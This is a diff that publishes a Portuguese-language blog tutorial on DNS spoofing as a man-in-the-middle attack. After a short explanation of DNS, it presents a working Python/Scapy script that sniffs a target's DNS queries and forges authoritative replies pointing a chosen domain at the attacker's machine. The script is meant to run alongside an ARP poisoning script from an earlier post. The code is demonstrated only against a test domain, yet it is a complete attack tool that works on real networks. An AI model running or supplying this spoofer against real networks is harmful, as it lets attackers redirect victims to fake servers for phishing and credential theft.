@@ -1,7 +1,123 @@
 ---
-title: 'DNS Spoofing - Ataque MITM'
-date: '2024-07-30'
+title: 'DNS Spoofing: Como interceptar requisições DNS - Ataque MITM'
+date: '2024-08-05'
 summary: 'Como continuação do ultimo artigo, iremos aprender como funciona o ataque DNS Spoofing, e como redirecionar requisições DNS ao nosso servidor.'
 tags: ['hacking', 'mitm']
-draft: true
+draft: false
 ---
+
+Como continuação do ultimo artigo, iremos aprender como funciona o ataque DNS Spoofing, e como redirecionar requisições DNS ao nosso servidor.
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## O que é o DNS
+
+O DNS (Domain Name System) é o sistema responsável por traduzir os endereços de domínio em endereços IP, permitindo que os usuários acessem sites através de nomes ao invés de números.
+
+Quando um usuário quer acessar facebook por exemplo, ele envia uma requisição DNS a um determinado servidor DNS, e esse servidor retorna o endereço IP dono do domínio "facebook.com".
+
+## Como funciona o ataque
+
+![Tete](/static/images/dns-spoof/dns-spoofing.webp)
+
+O DNS Spoofing funciona criando um servidor DNS que recebe as requisições do alvo e redireciona determinados sites (ou todos) a um outro servidor de sua escolha.
+
+Para que o atacante receba as requisições do alvo, ele depende de um outro ataque MITM chamado ARP Poisoning, que foi explicado no último artigo.
+
+Executando o ARP Poisoning e se passando pelo roteador, todas as requisições DNS do alvo serão redirecionadas à máquina do atacante.
+
+## Criando o script
+
+Agora que já entendemos como funciona o ataque iremos criar um script em python para executar o DNS Spoofing.
+
+Para realizar o ataque também será necessário usar o script de ARP Poisoning criado no [último artigo](https://reddyyz.github.io/blog/arp-poisoning-ataque-mitm).
+
+Bibliotecas que iremos usar:
+- scapy — Biblioteca responsável pela criação dos pacotes
+- netifaces — Biblioteca que usaremos para identificar o IP e MAC local.
+
+---
+
+Importando as bibliotecas necessárias:
+
+```python:dnsspoof.py
+from scapy.all import *
+import netifaces
+```
+
+Criando a função que irá redirecionar os sites à um servidor falso:
+
+```python:dnsspoof.py
+def handle_packet(pkt):
+    if pkt.haslayer(IP) and pkt.haslayer(DNS):
+        if pkt[IP].src != local_ip and pkt[Ether].dst == local_mac and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
+
+            if pkt[DNSQR].qname.decode() == "test.root.":
+                fake_pkt = IP(dst=pkt[IP].src,
+                              src=pkt[IP].dst)/\
+                              UDP(dport=pkt[UDP].sport, sport=53)/\
+                              DNS(id=pkt[DNS].id,
+                                  qd=pkt[DNS].qd,
+                                  aa=1,
+                                  qr=1,
+                                  ancount=1,
+                                  an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirect_ip))/\
+                              DNSRR(rrname=pkt[DNSQR].qname,
+                                    rdata=redirect_ip)
+
+                send(fake_pkt)
+                print(f"Requisicao DNS de {pkt[IP].src} redirecionada para {redirect_ip}")
+```
+
+Checando se a requisição não veio da nossa própria máquina, se o MAC de destino é o da nossa máquina e se é uma requisição DNS
+
+```python
+if pkt[IP].src != local_ip and pkt[Ether].dst == local_mac and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
+```
+
+Verificando se a requisição é ao site que queremos redirecionar.
+Nesta parte lembre-se de adicionar o ‘.’ ao final da URL.
+```python
+if pkt[DNSQR].qname.decode() == "test.root.":
+```
+
+Criando a resposta do DNS.
+O argumento `rrname` é o domínio da requisição e `rdata` é o IP no qual será redirecionado.
+
+```python
+an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirect_ip))/\ # RESPOSTA DNS
+# RRNAME=Site da requisicao
+# RDATA = IP PARA REDIRECIONAR
+```
+
+Na função principal definimos todas as variáveis que precisamos e iniciamos o ataque com a função `sniff`:
+
+```python:dnsspoof.py
+if __name__ == "__main__":
+    info_interface = netifaces.ifaddresses("eth0") # Obtem informacoes sobre a placa de rede
+
+    local_ip = info_interface[netifaces.AF_INET][0]['addr']
+    local_mac = info_interface[netifaces.AF_LINK][0]['addr']
+    redirect_ip = local_ip
+
+    print("Iniciando ataque")
+    sniff(prn=handle_packet)
+```
+
+[Código completo](https://gist.github.com/ReddyyZ/cd28f86a5c7913854f080a82c2a27090#file-dnsspoof-py)
+
+## Iniciando o ataque
+
+Com todos os scripts prontos, vamos iniciar o ataque.<br/>Primeiro executamos o script do ARP Poisoning:
+
+![ARP Poisoning](/static/images/dns-spoof/arp-poisoning.webp)
+
+E em seguida executamos o script do DNS Spoofing:
+
+![DNS Spoofing](/static/images/dns-spoof/iniciando-dns-spoof.webp)
+
+Com isso, todas as requisições DNS do alvo serão redirecionadas ao nosso servidor falso.
+
+Agora vamos tentar acessar o site que queremos redirecionar `test.root`:
+
+<Youtube videoId="ulsonS-rDwc"/>
